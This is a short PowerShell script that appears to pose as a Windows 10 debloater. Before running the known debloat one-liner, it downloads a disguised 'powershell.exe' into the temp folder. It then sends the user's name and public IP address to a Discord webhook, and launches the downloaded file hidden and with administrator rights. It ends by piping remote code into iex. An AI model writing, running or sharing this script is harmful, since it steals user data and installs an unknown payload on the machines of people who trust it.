iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/powershell.exe" -o $env:TEMP\powershell.exe

$hookUrl = 'https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ'
$Body = @{
  'content' = "Username : $env:UserName`nIP : " + (Invoke-WebRequest -useb -uri "http://ifconfig.me/ip").Content
}
Invoke-RestMethod -useb -Uri $hookUrl -Method 'post' -Body $Body

Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\powershell.exe
iwr -useb git.io/debloat|iex
